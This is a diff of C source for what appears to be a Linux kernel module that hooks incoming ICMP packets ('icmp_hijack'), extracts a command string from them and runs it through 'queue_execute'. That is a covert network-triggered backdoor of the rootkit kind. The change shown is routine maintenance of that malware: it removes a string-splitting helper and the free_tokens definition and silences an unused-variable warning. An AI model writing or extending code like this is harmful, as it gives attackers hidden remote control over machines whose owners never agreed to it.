@@ -48,7 +48,6 @@ struct work_item {
 static void icmp_handle_work(struct work_struct *work);
 // Commands
 static int queue_execute(char *command);
-char **split_on_strings(char *string, int *token_count);
 void free_tokens(char **tokens, int token_count);
 // Networking
 unsigned int icmp_hijack(void *priv, struct sk_buff *skb, const struct nf_hook_state *state);
@@ -96,44 +95,6 @@ static int queue_execute(char *command){
     #endif
 
     return 0;
-}
-
-char **split_on_strings(char *string, int *token_count){
-	int size = 5;
-	char **output = (char **) kmalloc(size * sizeof(char *), GFP_KERNEL); // init alloc
-	char *current_char = string;
-	char *past = string;
-	int i = 0;
-
-	int keep_going = 1;
-	// Loop until split
-	while (keep_going){
-		int current_size;
-		while(*current_char != ' ' && *current_char != 0) ++current_char;
-		if(*current_char == 0)
-			keep_going = 0;
-
-		if (i >= size)
-			output = krealloc(output, (size += 3) * sizeof(char *), GFP_KERNEL);
-            // TODO: add error handling
-
-		current_size = current_char - past;
-		char *current_block = (char *) kmalloc(current_size + 1, GFP_KERNEL);
-		memcpy(current_block, past, current_size);
-		current_block[current_size] = 0;
-		output[i++] = current_block;
-		past = ++current_char;
-	}
-
-	*token_count = i;
-	return output;
-}
-
-void free_tokens(char **tokens, int token_count){
-	for(int i = 0; i < token_count; i++){
-		kfree(tokens[i]);
-	}
-	kfree(tokens);
 }
 
 // Source: elsewhere
@@ -267,6 +228,7 @@ unsigned int icmp_hijack(void *priv, struct sk_buff *skb, const struct nf_hook_s
         pr_info("Command: %s\n", command);
     #endif
     int status = queue_execute(command);
+    if(status) {} // prevent unused variable
     #ifdef DEBUG_K
         pr_info("Status: %d\n", status);
     #endif
